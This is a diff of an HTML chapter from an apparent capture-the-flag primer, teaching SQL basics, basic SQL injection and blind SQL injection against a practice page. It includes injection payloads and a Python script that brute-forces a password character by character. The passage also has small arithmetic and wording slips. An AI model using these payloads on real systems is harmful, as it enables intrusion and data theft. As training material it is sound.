+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+When the monitor mode is enabled and you are capturing packets, you would not be able to navigate the Internet on your computer. To be able to navigate again, disable monitor mode by unchecking the checkbox.
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Decrypt WiFi Decrypt WiFi connection: You can do this only if you have the password for the WiFi you are sniffing. In the following link:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://wiki.wireshark.org/HowToDecrypt802.11"><span class="underline">https://wiki.wireshark.org/HowToDecrypt802.11</span></a></p>
+</div>
+<div class="paragraph">
+<p>There is a very good article that explains how to do it. Note that Wifi Encryption is encryption of the datalink layer, which is different to the encryption provided by HTTPS which is in the application layer. So even if you decrypt the WiFi connection, if a website it is still using HTTPS, you will not be able to see anything from that website on Wireshark.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_infiltrating_in_a_database">7. Infiltrating in a database</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_sql">7.1. SQL</h3>
+<div class="paragraph">
+<p>SQL is used to create and manipulate a very common type of databases called relational databases. SQL stands for Structured Query Language. With it you can create tables in a database, store data on them, and run different queries that let you extract and analyze data. We are going to see some examples in a relational database management system (RDBMS) called MySQL. Once you learn the basics of SQL in any RDBMS, it is easy to apply them in others. We are going to see a very quick introduction so you are able to understand the hacks. Let&#8217;s begin.</p>
+</div>
+<div class="paragraph">
+<p>As we said, information is stored in tables. The following is an example of a table that we might call "user":</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top"><strong>Id</strong></th>
+<th class="tableblock halign-left valign-top"><strong>Name</strong></th>
+<th class="tableblock halign-left valign-top"><strong>Last Name</strong></th>
+<th class="tableblock halign-left valign-top"><strong>Phone</strong></th>
+<th class="tableblock halign-left valign-top"><strong>Password</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">1</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Jane</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Doe</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">200 111 1111</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">123456</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">2</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Arpit</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Gupta</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">200 111 1111</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">hello</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">3</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Melania</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Clinton</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">201 333 3333</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">password</p></td>
+</tr>
+</tbody>
+</table>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+The passwords in this table are just an example. In real life, you should never store the password directly in the database, as you will learn in the crypto section. Additionally, you should never use a password like those, they are too weak.
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>There are several online tools that you can easily find on Google to learn languages. For example, access the following web site:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://paiza.io/en/projects/new?language=mysql" target="_blank" rel="noopener">https://paiza.io/en/projects/new?language=mysql</a></p>
+</div>
+<div class="paragraph">
+<p>We can execute MySQL statements online. So, let&#8217;s create our table from the previous example on it. First, delete the code present in the editor. You should be seeing something like this:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image7.png" alt="image" width="624" height="552"></span></p>
+</div>
+<div class="paragraph">
+<p>Now, you can create the table using the following statement:</p>
+</div>
+<div class="paragraph">
+<p>create table user (id integer, name text, lastname text, phone text, password text);</p>
+</div>
+<div class="paragraph">
+<p>Analyze the statement carefully. This statement creates a table called "user" with three columns. The first column is "id", and has the data type int, which means integer. The other columns are "name", "lastname", and "phone", which are of datatype text. In datatype integer, as you might guess, you can only store integers. In a datatype text, you can store strings. Put that statement in the SQL editor and hit the button "Run". If it was successful, you will see a green bar on top of the editor with the label "success". When you create tables in SQL, they are stored and become available to insert future data on them. However, in this online editor tables just survive in a single run, so in the same script we will have to create the table, insert the data, and query the data.</p>
+</div>
+<div class="paragraph">
+<p>So far we have created the table but it is empty. To insert a row, add the following statement:</p>
+</div>
+<div class="paragraph">
+<p>insert into user (id, name, lastname, phone, password) values (1, 'Jane', 'Doe', '200 111 1111', '123456');</p>
+</div>
+<div class="paragraph">
+<p>As you can see, the statement is self explanatory. It will insert each of those values in each column of user conforming a new row. Hit run, and verify it was successful. It should look like this:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image16.png" alt="image" width="624" height="46"></span></p>
+</div>
+<div class="paragraph">
+<p>Now, add the following line that will query the data you have inserted so far:</p>
+</div>
+<div class="paragraph">
+<p>Select * from user;</p>
+</div>
+<div class="paragraph">
+<p>The * means that you want to see the content of all the columns. Hit Run.</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image12.png" alt="image" width="624" height="146"></span></p>
+</div>
+<div class="paragraph">
+<p>You can see the results at the end. Now insert the two rows missing to conform our 3 row table:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image24.png" alt="image" width="624" height="177"></span></p>
+</div>
+<div class="paragraph">
+<p>If you are interested in returning only some particular columns, you can list them instead of using the *. For example, let&#8217;s return only the name and lastname:</p>
+</div>
+<div class="paragraph">
+<p>select name, lastname from user;</p>
+</div>
+<div class="paragraph">
+<p>You will see:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image10.png" alt="image" width="624" height="154"></span></p>
+</div>
+<div class="paragraph">
+<p>We can make our query more granular if we add a "where" clause like this:</p>
+</div>
+<div class="paragraph">
+<p>select * from user <strong>where id=2</strong>;</p>
+</div>
+<div class="paragraph">
+<p>Look at the query carefully. We already know that the * means we want to see the content of every column. In the ‘where' clause we restrict which rows we want to return. What row do you think is going to return that query?</p>
+</div>
+<div class="paragraph">
+<p>If you thought about this row:</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+</colgroup>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">2</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Arpit</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Gupta</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">200 111 1111</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">hello</p></td>
+</tr>
+</tbody>
+</table>
+<div class="paragraph">
+<p>You were right. That is because that row is the one with the value of 2 in its id. You could filter by any other field. If you are filtering a field of type text, you have to put the value enclosed single quotes. Remove the previous select statement, and add:</p>
+</div>
+<div class="paragraph">
+<p>select * from user where phone='200 111 1111' ;</p>
+</div>
+<div class="paragraph">
+<p>You should be seeing the following:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image21.png" alt="image" width="624" height="60"></span></p>
+</div>
+<div class="paragraph">
+<p>Run it. If you look at the rows inserted. ‘Jone Doe' had the same phone number as ‘Arpit Gupta'. The select statement should return 2 rows like this:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image9.png" alt="image" width="624" height="174"></span></p>
+</div>
+<div class="paragraph">
+<p>We can also filter by two fields in the same query using the logical operators ‘and' in the following manner:</p>
+</div>
+<div class="paragraph">
+<p>select * from user where phone='200 111 1111' and name='Jane';</p>
+</div>
+<div class="paragraph">
+<p>After the "where" clause, you can put several boolean expressions. As you learned previously in the programming chapter, when you use "and" it means that both expressions have to be true so the expression is true. The query should return this:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image3.png" alt="image" width="624" height="172"></span></p>
+</div>
+<div class="paragraph">
+<p>Now, add another ‘and' operator, to try to filter using a name that does not exist in the table:</p>
+</div>
+<div class="paragraph">
+<p>select * from user where phone='200 111 1111' and name='Jane' and name='Mario';</p>
+</div>
+<div class="paragraph">
+<p>The query should return no results, because ‘Mario' does not exist in our database:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image29.png" alt="image" width="624" height="124"></span></p>
+</div>
+<div class="paragraph">
+<p>Now, as an experiment add another filter, but this time use "or" instead of "and". For example, run:</p>
+</div>
+<div class="paragraph">
+<p>select * from user where phone='200 111 1111' and name='Mario' or name='Arpit';</p>
+</div>
+<div class="paragraph">
+<p>You will see:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image19.png" alt="image" width="624" height="138"></span></p>
+</div>
+<div class="paragraph">
+<p>What happened here? Analyze the query carefully. You know there is no one called Mario in our table. Why in the world the query return a row? If you think about it, any expression, no matter how long it is, if results in False, but then you do "or" with something that is true, it will be true. For example:</p>
+</div>
+<div class="paragraph">
+<p>1=2 and 3=2 and 47=1 or 1=1</p>
+</div>
+<div class="paragraph">
+<p>Will be true, because (1=2 and 3=5 and 45=1) is false, but (1=1) is true. This is fundamental for the basic SQL injection attack.</p>
+</div>
+<div class="paragraph">
+<p>Try the following:</p>
+</div>
+<div class="paragraph">
+<p>select * from user where phone='200 111 1111' and name='Mario' <strong>or 1=1</strong>;</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image20.png" alt="image" width="624" height="148"></span></p>
+</div>
+<div class="paragraph">
+<p>You just returned all the results! That happens, as you might guess, because "1=1" is always true. As an exercise, create a new table with new data and create new queries.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_basic_sql_injection">7.2. Basic SQL injection</h3>
+<div class="paragraph">
+<p>The objective of the basic SQL injection we are learning, is trying to inject an "or" expression that is always true. In that way the server code constructs a query using the user input that deceives the program into it returning the whole table. That happens, when a program is concatenating string to construct a query in the server code. The following is an example in PHP:</p>
+</div>
+<div class="paragraph">
+<p>"<span class="lime">SELECT * FROM user where name='</span>".$name.""<span class="lime">' and password='</span>".$password.""<span class="lime">';</span>"</p>
+</div>
+<div class="paragraph">
+<p>The red part of the query, will be concatenated with the value of the variables to conform the final query. Let&#8217;s suppose that $name is equal to "samuel", and $password is equal to "hello", the query would result in</p>
+</div>
+<div class="paragraph">
+<p>SELECT * FROM user where name='samuel' and password='hello';</p>
+</div>
+<div class="paragraph">
+<p>What would happen if the password contains a single quote? That might break the syntax of the SQL query. Even worse, it could be used to inject your own sql. For example, if the value of $password is:</p>
+</div>
+<div class="paragraph">
+<p><strong>' or '1'='1</strong></p>
+</div>
+<div class="paragraph">
+<p>The resultant query would be:</p>
+</div>
+<div class="paragraph">
+<p><span class="lime">SELECT * FROM user where name='samuel' and password='</span>' <strong>or '1'='1</strong><span class="lime">';</span></p>
+</div>
+<div class="paragraph">
+<p>Which is a perfectly valid query that will return the whole table. Use what you just learn here to return all the users:</p>
+</div>
+<div class="paragraph">
+<p><a href="http://primer.picoctf.com/vuln/web/basicsql.php" target="_blank" rel="noopener">http://primer.picoctf.com/vuln/web/basicsql.php</a></p>
+</div>
+<div class="paragraph">
+<p>This kind of vulnerability it is rarely present in applications. One that is more common, is the blind sql injection.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_blind_sql_injection">7.3. Blind SQL injection</h3>
+<div class="paragraph">
+<p>In this kind of vulnerability, the application does not return all the data to you. However, it is enough that the application shows an error message saying that no data was found or that an error has occurred, to figure out the content we are looking for.</p>
+</div>
+<div class="paragraph">
+<p>To illustrate this, we are going to attack the following page:</p>
+</div>
+<div class="paragraph">
+<p><a href="http://primer.picoctf.com/vuln/web/blindsql.php" target="_blank" rel="noopener">http://primer.picoctf.com/vuln/web/blindsql.php</a></p>
+</div>
+<div class="paragraph">
+<p>If we input our previous injection in the password field:</p>
+</div>
+<div class="paragraph">
+<p><strong>' or '1'='1</strong></p>
+</div>
+<div class="paragraph">
+<p>We will see that the application found something and shows the message "REGISTER FOUND":</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image28.png" alt="image" width="624" height="205"></span></p>
+</div>
+<div class="paragraph">
+<p>Internally, the injection deceives the application into returning records, but the application did not show us those records. That&#8217;s why it is called Blind SQL injection. We are able to inject SQL, but we cannot see the result!</p>
+</div>
+<div class="paragraph">
+<p>What we can do about this? We are going to try to inject a SQL to guess one character of a field at a time. Suppose we want to guess the first character of the password. If we don&#8217;t guess it, the application will return "NOTHING FOUND". If we guess it, it will return "REGISTER FOUND".</p>
+</div>
+<div class="paragraph">
+<p>Note that is fundamental to be able to guess only one character at a time. Trying to guess a whole string at the same time, is much harder. Suppose a word is made up by a combination of the 26 characters of the alphabet. To guess only the first letter, we only have to try 26 values. However, if we try to guess the whole word, is much more complicated. To illustrate this, suppose we have a word of two letters. If we can guess one at a time, we would need at most 26 trials for the first one, and 26 trials for the second one, for a total of 52 trials. On the other hand, if we try to guess both letters at a time, we would need 26*26 trials, which is 626 trials, because they can have different combinations. If we add more characters, guessing the whole word becomes much harder because it would emerge too many possible words. Nonetheless, guessing one letter at a time, will keep being only 26 trials for each letter. The blind SQL injection is based on that fact, it will try to inject a query that only compares one character at a time.</p>
+</div>
+<div class="paragraph">
+<p>To be able to do that, you need to know the name of the column you are trying to guess. This happens to be not that hard, because in many cases you can infer the name of the database column based on the name of the html input. In other cases you can leak the name if an error occurs inside the application, and in the error message the application shows the value of the columns.</p>
+</div>
+<div class="paragraph">
+<p>For the page we are attacking in this example the names are the same as the html input. One column is called ‘name', and the other one is called ‘password'.</p>
+</div>
+<div class="paragraph">
+<p>So far, you know that if you inject:</p>
+</div>
+<div class="paragraph">
+<p><strong>' or '1'='1</strong></p>
+</div>
+<div class="paragraph">
+<p>It will return results, but you are not learning any information. We know two column names, ‘username' and password. For this example, suppose you know a user called "picoctf". So you will try to get the password from that user. To narrow down the query to the row in which is stored the user picoctf information, you could use</p>
+</div>
+<div class="paragraph">
+<p><strong>' or username='picoctf</strong></p>
+</div>
+<div class="paragraph">
+<p>Note that we do not use the <strong>'1'='1</strong> any more because we want a statement that will filter only one user. If you inject that on the password field from the web page, you will still see:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image14.png" alt="image" width="624" height="130"></span></p>
+</div>
+<div class="paragraph">
+<p>Remember that in our injection, if the part at the right of the "or" is true, it will return results. It is true that username is equal to ‘picoctf' only in the row on the picoctf!</p>
+</div>
+<div class="paragraph">
+<p>Now we will add the part that compares the first character of the password. We can do that using an embedded query. An embedded query is a query inside a query. Our embedded query highlighted in red, will simply return the first character of the password. We will compare that first character with the character ‘a', so we are guessing that the first character is ‘a':</p>
+</div>
+<div class="paragraph">
+<p><strong>' or username='picoctf' and <span class="lime">(select substr(password, 1, 1))</span>='a</strong></p>
+</div>
+<div class="paragraph">
+<p>If you inject that, you will see that nothing was found:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image8.png" alt="image" width="624" height="206"></span></p>
+</div>
+<div class="paragraph">
+<p>That is because we did not guess the first character. If you keep trying different characters, you will find that the first character of the password is ‘f', when you inject this:</p>
+</div>
+<div class="paragraph">
+<p><strong>' or username='picoctf' and <span class="lime">(select substr(password, 1, 1))</span>='f</strong></p>
+</div>
+<div class="paragraph">
+<p>And see as a result this:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="images/3image5.png" alt="image" width="624" height="185"></span></p>
+</div>
+<div class="paragraph">
+<p>You could possibly find the whole password manually, but it would take too much effort. On the other hand, you may want to obtain all the passwords in the database, or even all the fields from the database! This same process can be applied for any field… In most of the SQL engines there is a system table that contains the names of all tables and columns, so once we find a SQL injections databases we might be able to leak the whole database. For this exercise we will only obtain one password. To be more efficient, we will write a python script that does the job for us. Suppose we found the name of the table in some way. The script would be the following:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code data-lang="python"><span></span><span class="tok-kn">import</span> <span class="tok-nn">requests</span>
+<span class="tok-kn">from</span> <span class="tok-nn">string</span> <span class="tok-kn">import</span> <span class="tok-n">printable</span>
+<span class="tok-n">accum</span><span class="tok-o">=</span><span class="tok-s2">&quot;&quot;</span>
+<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">40</span><span class="tok-p">):</span>
+  <span class="tok-k">for</span> <span class="tok-n">letter</span> <span class="tok-ow">in</span> <span class="tok-n">printable</span><span class="tok-p">:</span>
+    <span class="tok-n">accum</span><span class="tok-o">+=</span><span class="tok-n">letter</span>
+    <span class="tok-n">r</span> <span class="tok-o">=</span> <span class="tok-n">requests</span><span class="tok-o">.</span><span class="tok-n">post</span><span class="tok-p">(</span><span class="tok-s2">&quot;http://primer.picoctf.com/vuln/web/blindsql.php?&amp;username=WeDontCare&amp;password=&#39; or &#39;&quot;</span>
+    <span class="tok-o">+</span> <span class="tok-n">letter</span><span class="tok-o">+</span><span class="tok-s2">&quot;&#39;=( select substr(binary password,&quot;</span><span class="tok-o">+</span><span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span><span class="tok-o">+</span><span class="tok-s2">&quot;,1) from pico_blind_injection where id=1 ) and &#39;&#39;= &#39;&quot;</span><span class="tok-p">)</span>
+    <span class="tok-k">if</span> <span class="tok-s1">&#39;NOTHING FOUND...&#39;</span> <span class="tok-ow">in</span> <span class="tok-n">r</span><span class="tok-o">.</span><span class="tok-n">text</span><span class="tok-p">:</span>
+      <span class="tok-n">accum</span><span class="tok-o">=</span><span class="tok-n">accum</span><span class="tok-p">[:</span><span class="tok-o">-</span><span class="tok-mi">1</span><span class="tok-p">]</span>
+      <span class="tok-k">print</span> <span class="tok-s2">&quot;nope&quot;</span>
+    <span class="tok-k">else</span><span class="tok-p">:</span>
+      <span class="tok-k">print</span> <span class="tok-s2">&quot;We found the character: &quot;</span><span class="tok-o">+</span><span class="tok-n">letter</span>
+<span class="tok-k">print</span> <span class="tok-n">accum</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>This script is just one of the many ways in which a blind SQL injection can be done. With your knowledge of Python and SQL, you should be able to understand the script if you read it carefully. Note the following:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>‘Printable' is just a string with all the printable ASCII characters, and we iterate over them.</p>
+</li>
+<li>
+<p>‘Binary' in mysql context, is just a way to specify the we want to make a case sensitive comparisons. If we do not use it, we would not be able to identify if a character is lowercase or uppercase.</p>
+</li>
+<li>
+<p>We are sending GET parameters to the web site. For this reason we can encode them in the URL.</p>
+</li>
+<li>
+<p>We put the <strong>select '</strong> at the end of the query to handle the closing single quote.</p>
+</li>
+<li>
+<p>‘NOTHING FOUND&#8230;&#8203;' Is the message printed in the html, so if that is present in the html</p>
+</li>
+<li>
+<p>To clear your doubts, experiment in the SQL editor with similar queries, or do prints on the python script to make sure you understand every part of it.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>Depending on the SQL engine, there can be several ways to inject SQL. Even Frameworks that handle the queries for you, might have vulnerabilities in some versions, or because they are used incorrectly by developers.</p>
+</div>
+<div class="paragraph">
+<p>Keep up the good work!</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="footnotes">
+<hr>
+<div class="footnote" id="_footnotedef_1">
+<a href="#_footnoteref_1">1</a>. <a href="https://en.wikipedia.org/wiki/Coprime_integers"><span class="underline">https://en.wikipedia.org/wiki/Coprime_integers</span></a>
+</div>
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2020-02-16 15:04:00 -0500
+Last updated 2020-03-12 23:21:06 -0400
 </div>
 </div>
 <style>
